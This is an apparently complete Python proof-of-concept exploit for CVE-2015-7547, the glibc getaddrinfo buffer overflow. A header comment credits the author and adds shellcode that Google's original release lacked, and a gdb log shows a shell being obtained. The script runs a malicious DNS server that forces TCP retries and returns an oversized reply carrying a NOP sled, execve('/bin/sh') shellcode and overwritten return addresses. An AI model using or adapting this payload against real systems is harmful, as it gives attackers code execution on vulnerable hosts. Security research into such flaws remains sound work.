
/*

add by SpeeDr00t@Blackfalcon (jang kyoung chip)

This is a published vulnerability by google in the past.
Please refer to the link below.
  
Reference: 
- https://googleonlinesecurity.blogspot.kr/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html
- https://github.com/fjserna/CVE-2015-7547
- CVE-2015-7547: glibc getaddrinfo stack-based buffer overflow 

When Google announced about this code(vulnerability), 
it was missing information on shellcode.
So, I tried to completed the shellcode.
In the future, I hope to help your study.
  

(gdb) r
Starting program: /home/haker/client1 
Got object file from memory but can't read symbols: File truncated.
[UDP] Total Data len recv 36
[UDP] Total Data len recv 36
udp send 
sendto 1 
TCP Connected with 127.0.0.1:60259
[TCP] Total Data len recv 76
[TCP] Request1 len recv 36
data1 = ï¿½ï¿½foobargooglecom
query = foobargooglecom$(ï¿½foobargooglecom
[TCP] Request2 len recv 36
sendto 2 
data1_reply
data2_reply
[UDP] Total Data len recv 36
[UDP] Total Data len recv 36
udp send 
sendto 1 
TCP Connected with 127.0.0.1:60260
[TCP] Total Data len recv 76
[TCP] Request1 len recv 36
data1 = ï¿½ï¿½foobargooglecom
query = foobargooglecom$ï¿½7foobargooglecom
[TCP] Request2 len recv 36
sendto 2 
data1_reply
data2_reply
process 6415 is executing new program: /bin/dash
$ id
uid=1000(haker) gid=1000(haker) groups=1000(haker),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
$ 

*/




import socket
import time
import struct
import threading

IP = '192.168.111.5' # Insert your ip for bind() here...
ANSWERS1 = 184

terminate = False
last_reply = None
reply_now = threading.Event()


def dw(x):
    return struct.pack('>H', x)

def dd(x):
    return struct.pack('>I', x)

def dl(x):
    return struct.pack('<Q', x)

def db(x):
    return chr(x)

def udp_thread():
    global terminate

    # Handle UDP requests
    sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock_udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock_udp.bind((IP, 53))

    reply_counter = 0
    counter = -1

    answers = []

    while not terminate:
        data, addr = sock_udp.recvfrom(1024)
        print '[UDP] Total Data len recv ' + str(len(data))
        id_udp = struct.unpack('>H', data[0:2])[0]
        query_udp = data[12:]

        # Send truncated flag... so it retries over TCP
        data = dw(id_udp)                          # id
        data += dw(0x8380)                     # flags with truncated set
        data += dw(1)                        # questions
        data += dw(0)                        # answers
        data += dw(0)                        # authoritative
        data += dw(0)                        # additional
        data += query_udp                    # question
        data += '\x00' * 2500                # Need a long DNS response to force malloc 

        answers.append((data, addr))

        if len(answers) != 2:
            continue

        counter += 1

        if counter % 4 == 2:
            answers = answers[::-1]


        print 'udp send '
        time.sleep(0.01)
        sock_udp.sendto(*answers.pop(0))

        print 'sendto 1 '
        reply_now.wait()
        sock_udp.sendto(*answers.pop(0))
        print 'sendto 2 '

    sock_udp.close()


def tcp_thread():
    global terminate
    counter = -1

    #Open TCP socket
    sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock_tcp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock_tcp.bind((IP, 53))
    sock_tcp.listen(10)

    print 'a'
	
    while not terminate:
        conn, addr = sock_tcp.accept()
        counter += 1
        print 'TCP Connected with ' + addr[0] + ':' + str(addr[1])

        # Read entire packet
        data = conn.recv(1024)
        print '[TCP] Total Data len recv ' + str(len(data))

        reqlen1 = socket.ntohs(struct.unpack('H', data[0:2])[0])
        print '[TCP] Request1 len recv ' + str(reqlen1)
        data1 = data[2:2+reqlen1]

        print 'data1 = ' +data1

        id1 = struct.unpack('>H', data1[0:2])[0]
        query1 = data[12:]

        print 'query = ' + query1

        # Do we have an extra request?
        data2 = None
        if len(data) > 2+reqlen1:
            reqlen2 = socket.ntohs(struct.unpack('H', data[2+reqlen1:2+reqlen1+2])[0])
            print '[TCP] Request2 len recv ' + str(reqlen2)
            data2 = data[2+reqlen1+2:2+reqlen1+2+reqlen2]
            id2 = struct.unpack('>H', data2[0:2])[0]
            query2 = data2[12:]



    # Reply them on different packets
    data = ''
    data += dw(id1)                      # id
    data += dw(0x8180)                   # flags
    data += dw(1)                        # questions
    data += dw(ANSWERS1)                 # answers
    data += dw(0)                        # authoritative
    data += dw(0)                        # additional
    data += query1                       # question



    for i in range(ANSWERS1):
        answer = dw(0xc00c)  # name compressed
        answer += dw(1)      # type A
        answer += dw(1)      # class
        answer += dd(13)     # ttl
        answer += dw(4)      # data length
        answer += 'D' * 4    # data

        data += answer

    data1_reply = dw(len(data)) + data

    if data2:
        data = ''
        data += dw(id2)
        data += 'A' * (6)
        data += '\x08\xc5\xff\xff\xff\x7f\x00\x00'
        data += '\x90' * (44)
        data += '\x90' * (1955)
        data += '\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'
        data += '\x90' * (100)
        data += '\xc0\xc4\xff\xff\xff\x7f\x00\x00'
        data += 'F' * (8)
        data += '\xc0\xc4\xff\xff\xff\x7f\x00\x00'
        data += 'G' * (134)
        data2_reply = dw(len(data)) + data
    else:
        data2_reply = None

    reply_now.set()
    time.sleep(0.01)
    conn.sendall(data1_reply)
    print 'data1_reply'
    time.sleep(0.01)
    if data2:
        conn.sendall(data2_reply)
        print 'data2_reply'

    reply_now.clear()

    sock_tcp.shutdown(socket.SHUT_RDWR)
    sock_tcp.close()


if __name__ == "__main__":

    t = threading.Thread(target=udp_thread)
    t.daemon = True
    t.start()
    tcp_thread()
    terminate = True